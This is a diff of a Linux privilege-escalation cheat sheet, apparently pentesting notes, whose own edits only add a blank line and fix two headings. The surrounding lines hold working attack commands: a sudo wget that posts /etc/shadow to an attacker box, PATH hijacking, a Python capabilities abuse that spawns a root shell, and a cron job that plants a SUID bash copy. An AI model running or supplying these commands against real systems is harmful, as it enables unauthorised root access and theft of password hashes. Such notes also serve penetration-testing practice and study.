@@ -159,6 +159,7 @@ sudo /usr/bin/wget --post-file=/etc/shadow http//attackbox:port # Sudo -l but no
 ```bash
 sudo -u username unsafefileofusername # somehow pass /bin/bash as paramtres
 ```
+
 #### Shell escaping, abusing intended functionality
 **If find more I'll add more**  
 ```bash
@@ -295,7 +296,7 @@ export PATH="/dev/shm/badapple/:$PATH"
 ./runvulnbin
 ```
 
-## Capabilitieskernel
+## Capabilities
 ```bash
 getcap -r / 2>/dev/null
 /usr/bin/python[ver] -c 'import os; os.setuid(0);os.system("/bin/bash")'
@@ -308,7 +309,7 @@ ls -la [anyfiles] for permissions
 cat [anyfiles] for wildcards in scripting
 crontab -l # per-user user crontab!
 ```
-### Cron Pathkernel
+### Cron Path
 #### PATH variable of files
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > /home/user/privescCron
